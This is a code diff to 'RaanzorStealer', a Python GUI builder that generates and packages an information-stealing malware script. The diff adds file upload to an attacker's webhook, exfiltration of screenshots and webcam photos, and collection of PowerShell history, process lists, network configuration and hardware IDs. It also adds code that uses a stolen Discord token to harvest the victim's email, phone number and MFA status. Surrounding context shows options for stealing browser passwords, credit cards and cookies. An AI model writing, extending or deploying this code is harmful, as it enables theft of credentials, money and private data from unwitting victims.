@@ -20,11 +20,12 @@ import win32crypt
 from Crypto.Cipher import AES
 import shutil
 import threading
-
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import uuid
+import hashlib
 
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("dark-blue")
-
 
 class RaanzorStealer(ctk.CTk):
     def __init__(self):
@@ -37,7 +38,6 @@ class RaanzorStealer(ctk.CTk):
         self.build_top_frame()
         self.build_webhook_frame()
         self.build_checkbox_section()
-        self.build_obfuscation_option()
         self.build_status_label()
 
     def build_top_frame(self):
@@ -133,7 +133,12 @@ class RaanzorStealer(ctk.CTk):
             "History": ctk.BooleanVar(),
             "Cookies": ctk.BooleanVar(),
             "Common Files": ctk.BooleanVar(),
-            "Obfuscate Code": ctk.BooleanVar()
+            "TskMgr Info": ctk.BooleanVar(),
+            "Shell History": ctk.BooleanVar(),
+            "IPConf": ctk.BooleanVar(),
+            "HWID": ctk.BooleanVar(),
+            "UUID": ctk.BooleanVar(),
+            "Discord Info": ctk.BooleanVar()
         }
 
         container = ctk.CTkFrame(self, fg_color="#2B2B2B")
@@ -151,11 +156,11 @@ class RaanzorStealer(ctk.CTk):
         scrollbar.pack(side="right", fill="y")
 
         categories = {
-            "System Info & Network": ["System Info", "IP Info", "Wi-Fi SSID", "Kill All Programs", "Shutdown"],
-            "User Data & Privacy": ["Clipboard", "Browsers List", "Browsers Passwords", "Credit Cards", "Cookies", "History", "Common Files"],
+            "System Info & Network": ["System Info", "IP Info", "Wi-Fi SSID", "Kill All Programs", "Shutdown", "TskMgr Info", "IPConf", "HWID", "UUID"],
+            "User Data & Privacy": ["Clipboard", "Browsers List", "Browsers Passwords", "Credit Cards", "Cookies", "History", "Common Files", "Shell History"],
             "Security & Intrusion": ["Antivirus List", "Fake Error", "Disconnect User"],
             "Multimedia": ["Screenshot", "Webcam Screen"],
-            "Discord & Misc": ["Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop"]
+            "Discord & Misc": ["Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop", "Discord Info"]
         }
 
         self.checkboxes = {}
@@ -184,25 +189,6 @@ class RaanzorStealer(ctk.CTk):
                     col = 0
                     row_idx += 1
             row_idx += 1
-
-    def build_obfuscation_option(self):
-        sep = ttk.Separator(self, orient="horizontal")
-        sep.pack(fill="x", padx=30, pady=10)
-
-        obfuscate_frame = ctk.CTkFrame(self, fg_color="#2B2B2B")
-        obfuscate_frame.pack(fill="x", padx=30)
-
-        obfuscate_checkbox = ctk.CTkCheckBox(
-            obfuscate_frame,
-            text="Obfuscate Code",
-            variable=self.options["Obfuscate Code"],
-            text_color="white",
-            fg_color="#2B2B2B",
-            hover_color="#3E3E3E",
-            command=lambda: self.checkbox_color_update("Obfuscate Code")
-        )
-        obfuscate_checkbox.pack(padx=10, pady=10, anchor="w")
-        self.checkboxes["Obfuscate Code"] = obfuscate_checkbox
 
     def build_status_label(self):
         self.status_label = ctk.CTkLabel(self, text="", font=("Arial", 14), text_color="#E53935")
@@ -246,29 +232,11 @@ class RaanzorStealer(ctk.CTk):
             with open(script_path, "w", encoding="utf-8") as f:
                 f.write(script_content)
 
-            if self.options["Obfuscate Code"].get():
-                try:
-                    from programs.RaanzorOBFU import RaanzorObfuscator
-                    obfuscator = RaanzorObfuscator(script_content, script_path)
-                    obfuscator.obfuscate()
-                    self.show_message("Python script generated and obfuscated successfully.")
-                except Exception as e:
-                    self.show_message(f"Error during obfuscation: {e}")
-            else:
-                self.show_message("Python script generated successfully.")
+            self.show_message("Python script generated successfully.")
         else:
             script_path = "system_info.py"
             with open(script_path, "w", encoding="utf-8") as f:
                 f.write(script_content)
-
-            if self.options["Obfuscate Code"].get():
-                try:
-                    from programs.RaanzorOBFU import RaanzorObfuscator
-                    obfuscator = RaanzorObfuscator(script_content, script_path)
-                    obfuscator.obfuscate()
-                    self.show_message("Script obfuscated successfully.")
-                except Exception as e:
-                    self.show_message(f"Error during obfuscation: {e}")
 
             try:
                 os.system("pyinstaller --onefile --noconsole system_info.py")
@@ -305,6 +273,8 @@ from Crypto.Cipher import AES
 import shutil
 import threading
 from http.server import SimpleHTTPRequestHandler, HTTPServer
+import uuid
+import hashlib
 
 webhook = '{}'
 
@@ -318,6 +288,14 @@ def send_embed(title, fields):
         requests.post(webhook, json={{"embeds": [embed]}})
     except Exception as e:
         print(f"Error sending embed: {{e}}")
+
+def send_file(file_path, title):
+    try:
+        with open(file_path, "rb") as file:
+            files = {{"file": (file_path, file.read())}}
+            requests.post(webhook, files=files)
+    except Exception as e:
+        print(f"Error sending file: {{e}}")
 """.format(webhook))
 
         if "System Info" in options:
@@ -392,12 +370,9 @@ def take_screenshot():
     try:
         screenshot = pyautogui.screenshot()
         screenshot.save("screenshot.png")
+        send_file("screenshot.png", "📸 Screenshot")
     except Exception as e:
         print(f"Error taking screenshot: {{e}}")
-
-def send_screenshot():
-    take_screenshot()
-    send_embed("📸 Screenshot", [{{"name": "Screenshot", "value": "screenshot.png", "inline": False}}])
 """)
 
         if "Webcam Screen" in options:
@@ -409,12 +384,9 @@ def take_webcam_photo():
         if ret:
             cv2.imwrite("webcam_photo.png", frame)
         cap.release()
+        send_file("webcam_photo.png", "📷 Webcam Photo")
     except Exception as e:
         print(f"Error taking webcam photo: {{e}}")
-
-def send_webcam_photo():
-    take_webcam_photo()
-    send_embed("📷 Webcam Photo", [{{"name": "Photo", "value": "webcam_photo.png", "inline": False}}])
 """)
 
         if "Wi-Fi SSID" in options:
@@ -611,7 +583,21 @@ def get_discord_token():
 def get_discord_info():
     discord_token = get_discord_token()
     if discord_token:
-        send_embed("Discord Token \U0001F451", [{{"name": "Token", "value": discord_token, "inline": False}}])
+        headers = {{"Authorization": discord_token}}
+        try:
+            user_info = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
+            discord_info = [
+                {{"name": "ID", "value": user_info.get("id", "N/A"), "inline": True}},
+                {{"name": "Username", "value": user_info.get("username", "N/A"), "inline": True}},
+                {{"name": "Display Name", "value": user_info.get("global_name", "N/A"), "inline": False}},
+                {{"name": "Email", "value": user_info.get("email", "N/A"), "inline": True}},
+                {{"name": "Phone Number", "value": user_info.get("phone", "N/A"), "inline": True}},
+                {{"name": "Nitro Type", "value": user_info.get("premium_type", "N/A"), "inline": True}},
+                {{"name": "MFA Enabled", "value": user_info.get("mfa_enabled", "N/A"), "inline": True}}
+            ]
+            send_embed("Discord Info \U0001F451", discord_info)
+        except Exception as e:
+            print(f"Error getting Discord info: {{e}}")
     else:
         send_embed("Discord Token \U0001F451", [{{"name": "Token", "value": "Not Found", "inline": False}}])
 """)
@@ -746,6 +732,71 @@ def send_common_files():
     send_embed("Common Files", [{{"name": "Common Files", "value": files, "inline": False}}])
 """)
 
+        if "TskMgr Info" in options:
+            script_parts.append("""
+def get_tskmgr_info():
+    try:
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username']):
+            processes.append(f"PID: {{proc.info['pid']}}, Name: {{proc.info['name']}}, User: {{proc.info['username']}}")
+        send_embed("📊 Task Manager Info", [{{"name": "Processes", "value": '\\n'.join(processes), "inline": False}}])
+    except Exception as e:
+        print(f"Error getting task manager info: {{e}}")
+
+def take_tskmgr_screenshot():
+    try:
+        subprocess.run(["taskmgr"])
+        pyautogui.sleep(2)
+        screenshot = pyautogui.screenshot(region=(0, 0, 800, 600))
+        screenshot.save("tskmgr_screenshot.png")
+        send_file("tskmgr_screenshot.png", "📸 Task Manager Screenshot")
+    except Exception as e:
+        print(f"Error taking task manager screenshot: {{e}}")
+""")
+
+        if "Shell History" in options:
+            script_parts.append("""
+def get_shell_history():
+    try:
+        history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
+        if os.path.exists(history_path):
+            with open(history_path, "r", encoding="utf-8") as f:
+                history = f.read()
+            send_embed("📜 Shell History", [{{"name": "History", "value": history, "inline": False}}])
+    except Exception as e:
+        print(f"Error getting shell history: {{e}}")
+""")
+
+        if "IPConf" in options:
+            script_parts.append("""
+def get_ipconf():
+    try:
+        ipconf = subprocess.check_output(["ipconfig", "/all"], universal_newlines=True)
+        send_embed("🌐 IP Configuration", [{{"name": "IP Configuration", "value": ipconf, "inline": False}}])
+    except Exception as e:
+        print(f"Error getting IP configuration: {{e}}")
+""")
+
+        if "HWID" in options:
+            script_parts.append("""
+def get_hwid():
+    try:
+        hwid = subprocess.check_output(['wmic', 'csproduct', 'get', 'UUID']).decode().split('\\n')[1].strip()
+        send_embed("🔧 HWID", [{{"name": "HWID", "value": hwid, "inline": False}}])
+    except Exception as e:
+        print(f"Error getting HWID: {{e}}")
+""")
+
+        if "UUID" in options:
+            script_parts.append("""
+def get_uuid():
+    try:
+        uuid_val = str(uuid.uuid4())
+        send_embed("🔧 UUID", [{{"name": "UUID", "value": uuid_val, "inline": False}}])
+    except Exception as e:
+        print(f"Error getting UUID: {{e}}")
+""")
+
         script_parts.append("""
 if __name__ == "__main__":
 """)
@@ -764,9 +815,9 @@ if __name__ == "__main__":
             elif option == "Files on Desktop":
                 script_parts.append("    get_desktop_files()\n")
             elif option == "Screenshot":
-                script_parts.append("    send_screenshot()\n")
+                script_parts.append("    take_screenshot()\n")
             elif option == "Webcam Screen":
-                script_parts.append("    send_webcam_photo()\n")
+                script_parts.append("    take_webcam_photo()\n")
             elif option == "Wi-Fi SSID":
                 script_parts.append("    send_wifi_ssid()\n")
             elif option == "Kill All Programs":
@@ -791,7 +842,19 @@ if __name__ == "__main__":
                 script_parts.append("    send_cookies()\n")
             elif option == "Common Files":
                 script_parts.append("    send_common_files()\n")
-            
+            elif option == "TskMgr Info":
+                script_parts.append("    get_tskmgr_info()\n")
+                script_parts.append("    take_tskmgr_screenshot()\n")
+            elif option == "Shell History":
+                script_parts.append("    get_shell_history()\n")
+            elif option == "IPConf":
+                script_parts.append("    get_ipconf()\n")
+            elif option == "HWID":
+                script_parts.append("    get_hwid()\n")
+            elif option == "UUID":
+                script_parts.append("    get_uuid()\n")
+            elif option == "Discord Info":
+                script_parts.append("    get_discord_info()\n")
 
         return ''.join(script_parts)
 
